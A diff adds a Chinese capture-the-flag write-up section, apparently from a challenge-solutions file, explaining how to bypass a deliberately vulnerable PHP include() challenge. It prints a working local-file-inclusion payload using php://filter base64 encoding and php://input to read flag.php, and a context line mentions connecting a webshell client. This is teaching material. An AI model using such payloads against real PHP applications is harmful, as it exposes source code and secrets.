@@ -167,3 +167,45 @@ GIF89a
 完毕后中国蚁剑找到文件上传点，链接即可
 
 <br>
+
+### fileclude
+
+题解：`php://filter/red` + `php://input` 绕过
+
+打开网站首先看到的是一串源码
+
+```php
+<?php
+include("flag.php");
+highlight_file(__FILE__);
+if(isset($_GET["file1"]) && isset($_GET["file2"]))
+{
+    $file1 = $_GET["file1"];
+    $file2 = $_GET["file2"];
+    if(!empty($file1) && !empty($file2))
+    {
+        if(file_get_contents($file2) === "hello ctf")
+        {
+            include($file1);
+        }
+    }
+    else
+        die("NONONO");
+}
+```
+
+大意就是：需要通过 url 传入两个参数 file1 和 file2，且 file2 的内容必须为 `hello ctf`
+
+<br>
+
+可以构造如下载荷
+
+`?file1=php://filter/read=convert.base64-encode/resource=flag.php&file2=php://input`
+
+通过 apifox 中的 POST 请求，请求体使用 raw 格式，写入 hello ctf，此即代表了 file2 的内容！
+
+> file1 读取 flag.php 文件，而 file2 通过 POST 请求体传入指定字符串，成功拿到经过 base64 加密后的 flag
+
+<br>
+
+###
